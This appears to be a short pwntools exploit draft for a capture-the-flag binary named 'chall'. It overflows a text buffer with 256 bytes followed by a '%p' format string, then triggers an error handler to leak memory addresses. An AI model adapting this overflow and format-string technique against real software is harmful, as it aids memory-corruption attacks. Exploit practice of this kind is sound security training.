#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

p = process("./chall")
gdb.attach(p)

frmt_str = b"%p"

p.recvuntil(b"> ")
p.sendline(b"1")
p.recvuntil(b"Enter new text:")
p.sendline(b"A"*256 + frmt_str)

p.recvuntil(b"> ")
p.sendline(b"4") # trigger show_error

p.interactive()
